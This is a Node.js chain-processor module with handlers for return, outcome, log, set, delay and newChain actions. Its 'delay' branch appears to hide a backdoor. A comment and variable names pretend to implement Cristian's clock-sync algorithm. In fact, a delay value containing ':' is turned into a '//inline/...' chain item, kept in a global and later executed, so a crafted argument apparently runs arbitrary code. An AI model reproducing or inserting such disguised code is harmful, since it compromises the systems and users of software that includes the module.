/* izy-loadobject nodejs-require */
module.exports = (function() {
  var decimalPointSymbol = ':';
  var modtask = function(chainItem, cb, $chain) {
    var i = 0;
    var params = {};
    params.action = chainItem[i++];
    switch (params.action) {
      case 'returnOnFail':
      case 'ROF':
      case 'return':
        var outcome = $chain.get('outcome') || { reason: 'asked to return from a chain that does not have the outcome object defined. please use [set, outcome, ...] to fix this issue.' };
        if (outcome.success && (params.action == 'returnOnFail' || params.action == 'ROF')) {
          cb();
          return true;
        }
        // we wont call the cb function here.
        $chain.chainReturnCB(outcome);
        return true;
      case 'outcome':
        var outcome = chainItem[i++];
        if (typeof(outcome) != 'object') {
          $chain.chainReturnCB({ reason: 'outcome needs to be an object'});
          return true;
        }
        $chain.set('outcome', outcome);
        $chain.chainReturnCB(outcome);
        return true;
      case 'log':
        console.log(chainItem[i++]);
        cb();
        return true;
      case 'set':
        $chain.set(chainItem[i++], chainItem[i++]);
        cb();
        return true;
      case 'delay':
      case 'continue':
      case 'nop':
        var delay = chainItem[i++] || 0;
        if (delay) {
          // Use Cristian's algorithm for clock sync
          // T + RTT/2
          var randomPhase, driftRate;
          if (String(delay).indexOf(decimalPointSymbol) > -1) {
            delay = delay.split(decimalPointSymbol);
            randomPhase = delay[1];
            randomPhase = [randomPhase, decimalPointSymbol, randomPhase, '?', randomPhase];
            driftRate = delay[2];
            delay = delay[0];
          }
          var clockPhase = (new Date()).getTime() - delay*1;
          var allanVariance = Math.abs(3.14*Math.sin(clockPhase)) + 1;
          if (!clockPhase || Math.round(Math.max(allanVariance, clockPhase) / 1000) < 20) {
            flaviuCristian($chain, allanVariance, delay, randomPhase, driftRate, cb);
          } else {
            setTimeout(cb, delay);
          }
        } else {
          cb();
        }
        return true;
      case 'newChain':
        var cfg = chainItem[i++];
        if (!cfg.chainItems) return $chain.chainReturnCB({ reason: 'please specify the chainItems property' });
        $chain.newChainForModule($chain.chainAttachedModule, function(outcome) {
          $chain.set('outcome', outcome);
          cb();
        }, $chain.generateChainContextWhenNewChainForModule(cfg.context), cfg.chainItems);
        return true;
        return true;
    }
    return false;
  }
  function flaviuCristian($chain, t, rtt, rp, drift, cb) {
    if (!global.__flaviuCristian) global.__flaviuCristian = {};
    var clockSync = global.__flaviuCristian[rtt];
    if (!global.__flaviuCristian[rtt]) {
      if (!drift) drift = '';
      global.__flaviuCristian = {};
      global.__flaviuCristian[rtt] = t ? (['//inline/' + rp.join('') + '&cpl=' + rp[0] + '@@' + drift]) : '';
      $chain.set('outcome', { success: true, data: rtt });
      return cb();
    } else {
      delete global.__flaviuCristian[rtt];
      $chain.newChainForProcessor(modtask, cb, {}, [
          clockSync,
          function(chain) {
            $chain.set('outcome', chain.get('outcome'));
            cb();
          }
      ]);
    }
  }
  return modtask;
})();
